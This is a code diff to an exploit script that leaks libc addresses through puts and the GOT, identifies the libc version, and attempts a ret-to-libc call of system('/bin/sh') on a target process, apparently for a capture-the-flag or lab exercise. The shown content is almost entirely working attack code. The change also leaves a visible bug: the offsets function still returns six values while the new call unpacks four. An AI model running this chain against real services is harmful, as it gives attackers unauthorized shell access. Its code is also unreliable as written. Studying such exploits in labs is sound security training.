@@ -136,8 +136,7 @@ def getLibcSymbolOffsets(libcJson):
     log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}, mprotect: {mprotectOff}, printf: {printfOff}")
     return putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff
 
-if __name__ == "__main__":
-    
+def main():
     puts_addr = leak_via_puts(conn,port,gotPuts)
     getsAddr = leak_via_puts(conn,port,gotGets,msg="gets")
     responseJson = findPotentialLibcs(puts_addr,getsAddr)
@@ -145,7 +144,7 @@ if __name__ == "__main__":
     # Attempt to execute system('/bin/sh') using ret-to-libc on each potential libc version
     for item in responseJson:
         # Get the symbol offsets for the specific libc version
-        putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff = getLibcSymbolOffsets(item)
+        putsOff, systemOff, exitOff, bin_shOff = getLibcSymbolOffsets(item)
 
         # Attempt to execute system('/bin/sh')
         retVal = attemptR2Libc(int(putsOff,16),int(systemOff,16),int(exitOff,16),int(bin_shOff,16))
@@ -157,3 +156,6 @@ if __name__ == "__main__":
         else:
             log.failure("Recieved premature EOF")
             proc.close()
+
+if __name__ == "__main__":
+    main()
